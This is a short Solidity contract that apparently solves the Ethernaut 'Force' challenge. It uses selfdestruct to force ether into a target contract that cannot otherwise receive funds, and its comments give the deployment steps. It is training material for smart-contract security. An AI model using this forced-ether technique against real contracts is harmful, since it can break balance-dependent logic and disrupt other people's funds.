pragma solidity ^0.4.24;

contract SelfDestruct{
    address lover;

    constructor(address _lover) public payable{
        lover = _lover;
    }

    function kill() public {
        selfdestruct(lover);
    }
}

// deploy this contract, with _lover as the `Force` contract address with 1 wei
// then call `kill()` it, will forward the amount to the `Force` contract.
